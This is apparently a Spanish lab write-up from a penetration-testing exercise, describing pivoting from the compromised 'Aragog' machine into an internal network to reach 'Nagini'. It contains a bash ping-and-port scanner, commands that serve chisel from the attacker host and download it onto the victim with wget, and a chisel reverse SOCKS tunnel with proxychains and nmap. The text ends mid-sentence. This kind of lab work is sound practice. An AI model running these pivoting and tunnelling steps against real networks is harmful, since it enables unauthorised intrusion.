#Aragog
[[192.168.1.23 (Aragog)]]
- Pwned

En el directorio `/tmp` creamos un fichero llamo `hostDiscovery.sh` que nos permitirá hacer un reconocimiento de red sobre esa interfaz para encontrar host activos:
El script lo que hace directamente es buscar sobre las IP que respondan a una llamada y tengan puertos activos.
```shell
#!/bin/bash

# Función para escanear puertos de un host activo
scan_host() {
    local host=$1
    for port in 21 22 80 443 445 8080; do
        # Intenta conectarse al puerto con timeout
        timeout 1 bash -c "echo > /dev/tcp/$host/$port" &>/dev/null && \
            echo "[+] Host $host - PORT $port - OPEN"
    done
}

# Capturar Ctrl+C para salir limpio
trap "echo -e '\n[*] Escaneo interrumpido'; exit" SIGINT

for i in $(seq 1 254); do
    host="10.10.0.$i"
    # Comprobar si el host está activo
    if ping -c 1 -W 1 $host &>/dev/null; then
        echo "[*] Host $host activo. Escaneando puertos..."
        scan_host $host
    fi
done
```

Lo ejecutamos y nos dará la otra ip que se ve desde nuestra interfaz de red [[10.10.0.4 (Aragog)]]
Vemos que hay una IP del otro lado que es la `10.10.0.5`

Usaremos `https://github.com/jpillora/chisel`para crear un túnel de tipo socks para llegar a los puertos que hay en los puertos de la red interna que desde nuestra maquina atacante no llegamos a ver.

Lo descargamos y lo descomprimimos y le damos permisos de ejecución.
Lo transferimos a la maquina victima a través de Python
`python3 -m http.server 80`

Y en la maquina victima:
`wget http://192.168.1.19/chisel`

Ejecutamos chisel en la maquina atacante como servidor para que las maquinas se conecten a el
`./chisel server --reverse -p 1234`

Ahora en la maquina victima lo ejecutamos como cliente en la maquina victima:
`./chisel client 192.168.1.19:1234 R:socks`

Lo que estamos haciendo con el parámetro `R:1080:socks` es abrirte el puerto `1080` haciéndote un túnel directo a la maquina `10.10.0.5`


En la maquina atacante abrimos el archivo ` /etc/proxychains4.conf` y modificamos:
`dynamic_chain` comentado
`stric_chain` descomentado
Y al final del documento añadimos `socks5 127.0.0.1 1080`

Ahora cuando queramos hacer una enumeración de puertos de la maquina victima [[10.10.0.5(Nagini)]] deberemos usar `nmap -sT -Pn -p- -open -T5 -v -n 10.10.0.5 2>/dev/null`

Si queremos que sea mas rápido utilizaremos secuenciadores y xargs para paralelizar comandos:





